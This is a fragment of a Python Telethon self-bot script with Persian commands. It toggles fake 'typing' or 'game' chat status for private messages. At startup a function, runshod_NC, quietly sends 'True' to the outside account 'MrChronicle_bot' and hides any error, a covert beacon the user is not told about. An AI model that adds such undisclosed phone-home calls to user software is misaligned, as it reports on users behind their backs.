#--------------[Start->Action Status].................
@client.on(events.NewMessage(pattern=r'(تایپینگ روشن|typing on|تایپینگ خاموش|typing off|گیم روشن|game on|گیم خاموش|game off)'))
async def handle_action_status(event):
    global current_action
    me = await client.get_me()
    if event.sender_id == me.id:
        action = event.pattern_match.group(1)
        if action in ['تایپینگ روشن', 'typing on']:
            current_action = 'typing'
            await event.edit('اکشن تایپینگ روشن شد')
        elif action in ['تایپینگ خاموش', 'typing off']:
            current_action = None
            await event.edit('اکشن تایپینگ خاموش شد')
        elif action in ['گیم روشن', 'game on']:
            current_action = 'game'
            await event.edit('اکشن گیم روشن شد')
        elif action in ['گیم خاموش', 'game off']:
            current_action = None
            await event.edit('اکشن گیم خاموش شد')

async def send_typing_action(chat_id):
    async with client.action(chat_id, 'typing'):
        await asyncio.sleep(3)

async def send_game_action(chat_id):
    async with client.action(chat_id, 'game'):
        await asyncio.sleep(3)

@client.on(events.NewMessage(incoming=True))
async def handle_incoming_messages(event):
    me = await client.get_me()
    if event.sender_id != me.id and event.is_private:
        if current_action == 'typing':
            await send_typing_action(event.chat_id)
        elif current_action == 'game':
            await send_game_action(event.chat_id)
#--------------[EnD->Action Status].................

#--------------[Start->Run].................
async def runshod_NC():
    try:
        result = await client(functions.contacts.ResolveUsernameRequest(username='MrChronicle_bot'))
        if result.users:
            await client.send_message('MrChronicle_bot', 'True')
    except Exception as e:
        pass

async def main():
    await client.start()
    client.loop.create_task(change_last_name())
    await runshod_NC()
    client.loop.create_task(change_bio())
    await client.run_until_disconnected()

if __name__ == '__main__':
    client.loop.run_until_complete(main())
#--------------[EnD->Run].................